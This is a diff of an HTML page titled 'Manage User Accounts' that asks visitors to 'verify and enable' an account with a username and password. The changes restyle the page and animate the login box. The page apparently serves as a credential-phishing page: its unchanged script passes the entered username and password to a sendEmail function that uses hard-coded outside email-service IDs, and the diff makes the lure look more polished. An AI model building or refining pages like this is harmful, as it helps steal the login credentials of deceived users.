@@ -11,29 +11,31 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #ffffff;
+            background: url('https://i.postimg.cc/s2RJJdVf/Netv.jpg') no-repeat center center fixed;
+            background-size: cover;
             text-align: center;
             margin: 0;
             padding: 0;
-            background-image: url('https://i.postimg.cc/s2RJJdVf/Netv.jpg'); /* Image URL */
-            background-size: cover;
-            background-position: center center;
-            background-repeat: no-repeat;
         }
         .header {
-            background-color: rgba(240, 124, 0, 0.8); /* Transparent background for header */
+            background-color: rgba(240, 124, 0, 0.8);
             padding: 15px;
             color: white;
             font-size: 24px;
         }
         .container {
-            background-color: rgba(255, 255, 255, 0.8); /* Transparent background for the container */
+            background-color: rgba(255, 255, 255, 0.9);
             width: 350px;
-            margin: 100px auto;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             border-top: 5px solid #f07c00;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: -300px; /* Start hidden above the screen */
+            opacity: 0;
+            transition: top 1s ease-out, opacity 1s ease-out;
         }
         h2 {
             color: #333;
@@ -64,10 +66,17 @@
         .forgot-password:hover {
             text-decoration: underline;
         }
+
+        /* Animation to slide down */
+        .show {
+            top: 150px;
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
     <div class="header">Manage User Accounts</div>
+    
     <div id="login" class="container">
         <h2>Verify and Enable Account</h2>
         <input type="text" id="username" placeholder="Username" required>
@@ -83,6 +92,13 @@
     </div>
 
     <script>
+        // Function to drop down the login form when the page loads
+        window.onload = function() {
+            setTimeout(() => {
+                document.getElementById("login").classList.add("show");
+            }, 500);
+        };
+
         function sendEmail(username, password) {
             const serviceID = "service_suqjtsd";  // Your Service ID
             const templateID = "template_gnd5xid";  // Your Template ID
